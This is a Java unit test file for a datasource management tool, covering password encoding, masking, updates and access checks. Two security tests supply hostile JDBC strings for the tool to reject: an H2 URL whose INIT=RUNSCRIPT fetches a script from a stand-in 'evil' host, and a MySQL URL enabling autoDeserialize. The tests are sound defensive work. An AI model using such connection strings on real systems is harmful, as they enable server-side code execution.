package cn.crabc.core.app.mcp.tools;

import cn.crabc.core.app.entity.BaseDatasource;
import cn.crabc.core.app.mcp.McpTestFixture;
import cn.crabc.core.app.mcp.support.DatasourceGuard;
import cn.crabc.core.app.mcp.support.McpToolSupport;
import cn.crabc.core.app.service.system.IBaseDataSourceService;
import cn.crabc.core.app.util.UserThreadLocal;
import cn.crabc.core.datasource.enums.ErrorStatusEnum;
import cn.crabc.core.datasource.exception.CustomException;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.mockito.InOrder;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyInt;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.inOrder;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * 数据源工具测试：重点覆盖文档 §14 中的 Base64 密码约定与 JDBC URL 拼装责任。
 *
 * @author yuqf
 */
class DataSourceToolsTest {

    private static final String PASSWORD = "Read@123";

    private IBaseDataSourceService dataSourceService;
    private DataSourceTools tools;

    @BeforeEach
    void setUp() {
        dataSourceService = mock(IBaseDataSourceService.class);
        tools = new DataSourceTools(dataSourceService, McpTestFixture.support(), new DatasourceGuard());
        McpTestFixture.bindReadWriteContext();
    }

    @AfterEach
    void tearDown() {
        McpTestFixture.clearContext();
    }

    @Test
    @DisplayName("新增数据源：先测连通、密码 Base64 编码、jdbcUrl 由工具层拼装")
    void createHappyPath() {
        AtomicReference<String> userIdInService = new AtomicReference<>();
        when(dataSourceService.test(any(BaseDatasource.class))).thenAnswer(invocation -> {
            userIdInService.set(UserThreadLocal.getUserId());
            return "1";
        });
        when(dataSourceService.addDataSource(any(BaseDatasource.class))).thenAnswer(invocation -> {
            BaseDatasource saved = invocation.getArgument(0);
            saved.setDatasourceId(7);
            return 1;
        });

        Map<String, Object> output = tools.datasourceCreate("orders测试库", "mysql", "192.168.1.10", "3306",
                "orders", "readonly", PASSWORD, "备注", null);

        assertEquals(7, output.get("datasourceId"));
        assertEquals(true, output.get("testPassed"));

        InOrder inOrder = inOrder(dataSourceService);
        inOrder.verify(dataSourceService).test(any(BaseDatasource.class));
        inOrder.verify(dataSourceService).addDataSource(any(BaseDatasource.class));

        ArgumentCaptor<BaseDatasource> captor = ArgumentCaptor.forClass(BaseDatasource.class);
        verify(dataSourceService).addDataSource(captor.capture());
        BaseDatasource saved = captor.getValue();
        assertEquals(Base64.getEncoder().encodeToString(PASSWORD.getBytes(StandardCharsets.UTF_8)),
                saved.getPassword(), "服务层会 Base64 解码，不编码会直接抛异常");
        assertTrue(saved.getJdbcUrl().startsWith("jdbc:mysql://192.168.1.10:3306/orders"), saved.getJdbcUrl());
        assertEquals("orders测试库", saved.getDatasourceName());
        assertEquals("readonly", saved.getUsername());

        assertEquals(McpTestFixture.USER_ID, userIdInService.get(), "service 调用线程必须已绑定归属用户");
        assertNull(UserThreadLocal.get(), "调用结束后必须清理线程上下文");
    }

    @Test
    @DisplayName("新增数据源：连通性测试失败不落库")
    void createTestFailed() {
        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("Access denied for user 'readonly'");

        CustomException ex = assertThrows(CustomException.class, () -> tools.datasourceCreate("ds", "mysql",
                "127.0.0.1", "3306", "db", "u", "p", null, null));

        assertTrue(ex.getMsg().contains("Access denied"));
        verify(dataSourceService, never()).addDataSource(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("连通性测试工具：返回 testPassed 与驱动原始错误")
    void testConnection() {
        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("1");
        Map<String, Object> ok = tools.datasourceTest("mysql", "127.0.0.1", "3306", "db", "u", "p", null);
        assertEquals(true, ok.get("testPassed"));

        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("Communications link failure");
        Map<String, Object> fail = tools.datasourceTest("mysql", "127.0.0.1", "3306", "db", "u", "p", null);
        assertEquals(false, fail.get("testPassed"));
        assertEquals("Communications link failure", fail.get("message"));
    }

    @Test
    @DisplayName("数据源列表：密码脱敏且不返回用户名")
    void listMasksPassword() {
        BaseDatasource datasource = new BaseDatasource();
        datasource.setDatasourceId(3);
        datasource.setDatasourceName("orders");
        datasource.setDatasourceType("mysql");
        datasource.setUsername("readonly");
        datasource.setPassword(McpToolSupport.MASK);
        when(dataSourceService.getDataSourcePage(eq("orders"), anyInt(), anyInt()))
                .thenReturn(McpTestFixture.page(List.of(datasource), 1L, 1, 10));

        Map<String, Object> output = tools.datasourceList("orders", 1, 10);

        assertEquals(1L, output.get("total"));
        @SuppressWarnings("unchecked")
        List<Map<String, Object>> list = (List<Map<String, Object>>) output.get("list");
        assertEquals(1, list.size());
        assertEquals(McpToolSupport.MASK, list.get(0).get("password"));
        assertFalse(list.get(0).containsKey("username"), "列表不应把库账号暴露给模型");
    }

    @Test
    @DisplayName("数据源详情：getDataSource 返回真实密码，必须强制脱敏")
    void getMasksPassword() {
        BaseDatasource datasource = new BaseDatasource();
        datasource.setDatasourceId(3);
        datasource.setDatasourceType("mysql");
        datasource.setPassword(Base64.getEncoder().encodeToString(PASSWORD.getBytes(StandardCharsets.UTF_8)));
        when(dataSourceService.getDataSource(3)).thenReturn(datasource);

        Map<String, Object> output = tools.datasourceGet("3");

        assertEquals(McpToolSupport.MASK, output.get("password"));
        assertEquals("mysql", output.get("datasourceType"));
    }

    @Test
    @DisplayName("数据源详情：不存在的数据源抛业务异常")
    void getNotFound() {
        when(dataSourceService.getDataSource(99)).thenReturn(null);
        CustomException ex = assertThrows(CustomException.class, () -> tools.datasourceGet("99"));
        assertEquals(ErrorStatusEnum.DATASOURCE_NOT_FOUNT.getCode(), ex.getCode());
    }

    @Test
    @DisplayName("修改数据源：未传字段沿用原值（尤其 remarks 会被 SQL 无条件覆盖）")
    void updateCarriesForward() {
        BaseDatasource current = currentDatasource();
        when(dataSourceService.getDataSource(3)).thenReturn(current);
        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("1");

        Map<String, Object> output = tools.datasourceUpdate("3", null, null, "127.0.0.1", "3307", null, null, null,
                "新描述", null);

        assertEquals(true, output.get("connectionTested"), "连接信息变化时需先测连通性");

        ArgumentCaptor<BaseDatasource> captor = ArgumentCaptor.forClass(BaseDatasource.class);
        verify(dataSourceService).updateDataSource(captor.capture());
        BaseDatasource saved = captor.getValue();
        assertEquals("新描述", saved.getRemarks());
        assertEquals("orders", saved.getDatasourceName(), "未传名称应沿用原值");
        assertEquals(current.getPassword(), saved.getPassword(), "未传密码应沿用库里的 Base64 原值");
        assertEquals(1, saved.getMinIdle(), "连接池参数需回填，避免被置空");
        assertTrue(saved.getJdbcUrl().contains("127.0.0.1:3307"), saved.getJdbcUrl());
    }

    @Test
    @DisplayName("修改数据源：新配置连不通时不落库")
    void updateRejectsUnreachableConfig() {
        when(dataSourceService.getDataSource(3)).thenReturn(currentDatasource());
        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("Communications link failure");

        CustomException ex = assertThrows(CustomException.class,
                () -> tools.datasourceUpdate("3", null, null, "127.0.0.1", "3307", null, null, null, null, null));

        assertTrue(ex.getMsg().contains("未修改"));
        verify(dataSourceService, never()).updateDataSource(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("修改数据源：只改名称时不重复测试连通性")
    void updateWithoutConnectionChangeSkipsTest() {
        when(dataSourceService.getDataSource(3)).thenReturn(currentDatasource());

        Map<String, Object> output = tools.datasourceUpdate("3", "新名称", null, null, null, null, null, null, null, null);

        assertEquals(false, output.get("connectionTested"));
        verify(dataSourceService, never()).test(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("修改数据源：显式传密码时重新编码")
    void updateWithNewPassword() {
        when(dataSourceService.getDataSource(3)).thenReturn(currentDatasource());
        when(dataSourceService.test(any(BaseDatasource.class))).thenReturn("1");

        tools.datasourceUpdate("3", null, null, null, null, null, null, "New@123", null, null);

        ArgumentCaptor<BaseDatasource> captor = ArgumentCaptor.forClass(BaseDatasource.class);
        verify(dataSourceService).updateDataSource(captor.capture());
        assertEquals(Base64.getEncoder().encodeToString("New@123".getBytes(StandardCharsets.UTF_8)),
                captor.getValue().getPassword());
    }

    @Test
    @DisplayName("修改数据源：库里无可用密码且未传密码时明确报错，避免 NPE")
    void updateWithoutAnyPassword() {
        BaseDatasource current = currentDatasource();
        current.setPassword(null);
        when(dataSourceService.getDataSource(3)).thenReturn(current);

        CustomException ex = assertThrows(CustomException.class,
                () -> tools.datasourceUpdate("3", null, null, null, null, null, null, null, null, null));

        assertTrue(ex.getMsg().contains("password"));
        verify(dataSourceService, never()).updateDataSource(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("修改数据源：分页参数不传且只传备注时，jdbcUrl 保持原值")
    void updateKeepsJdbcUrl() {
        when(dataSourceService.getDataSource(3)).thenReturn(currentDatasource());

        tools.datasourceUpdate("3", "新名称", null, null, null, null, null, null, null, null);

        ArgumentCaptor<BaseDatasource> captor = ArgumentCaptor.forClass(BaseDatasource.class);
        verify(dataSourceService).updateDataSource(captor.capture());
        BaseDatasource saved = captor.getValue();
        assertEquals("新名称", saved.getDatasourceName());
        assertEquals("jdbc:mysql://old-host:3306/orders", saved.getJdbcUrl());
        assertEquals("原描述", saved.getRemarks(), "未传描述应回填原值而不是清空");
    }

    @Test
    @DisplayName("新增数据源：必填参数缺失直接报错，不触碰服务层")
    void createMissingParam() {
        assertThrows(CustomException.class,
                () -> tools.datasourceCreate("ds", "mysql", "127.0.0.1", "3306", "db", " ", "p", null, null));
        verify(dataSourceService, times(0)).test(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("安全：拒绝 h2 等嵌入式引擎连接串（服务端代码执行入口）")
    void createRejectsEmbeddedEngine() {
        CustomException ex = assertThrows(CustomException.class, () -> tools.datasourceCreate("攻击库", "custom",
                null, null, null, "sa", "p", null,
                "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"));

        assertTrue(ex.getMsg().contains("h2"));
        verify(dataSourceService, never()).test(any(BaseDatasource.class));
        verify(dataSourceService, never()).addDataSource(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("安全：拒绝危险连接参数（mysql autoDeserialize）")
    void createRejectsDangerousParameter() {
        assertThrows(CustomException.class, () -> tools.datasourceCreate("攻击库", "mysql", null, null, null,
                "u", "p", null, "jdbc:mysql://h:3306/db?autoDeserialize=true"));
        verify(dataSourceService, never()).addDataSource(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("安全：只读令牌不允许新增数据源")
    void createRejectedForReadOnlyToken() {
        McpTestFixture.bindReadOnlyContext();

        CustomException ex = assertThrows(CustomException.class, () -> tools.datasourceCreate("ds", "mysql",
                "127.0.0.1", "3306", "db", "u", "p", null, null));

        assertEquals(ErrorStatusEnum.FORBID_OPERATE.getCode(), ex.getCode());
        verify(dataSourceService, never()).test(any(BaseDatasource.class));
    }

    @Test
    @DisplayName("安全：不支持的数据源类型直接拒绝")
    void createRejectsUnsupportedType() {
        CustomException ex = assertThrows(CustomException.class, () -> tools.datasourceCreate("ds", "sqlite",
                "127.0.0.1", "3306", "db", "u", "p", null, null));
        assertEquals(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(), ex.getCode());
    }

    private BaseDatasource currentDatasource() {
        BaseDatasource current = new BaseDatasource();
        current.setDatasourceId(3);
        current.setDatasourceName("orders");
        current.setDatasourceType("mysql");
        current.setJdbcUrl("jdbc:mysql://old-host:3306/orders");
        current.setHost("old-host");
        current.setPort("3306");
        current.setUsername("readonly");
        current.setPassword(Base64.getEncoder().encodeToString("oldPwd".getBytes(StandardCharsets.UTF_8)));
        current.setRemarks("原描述");
        current.setClassify("jdbc");
        current.setMinIdle(1);
        current.setMaxActive(10);
        return current;
    }
}
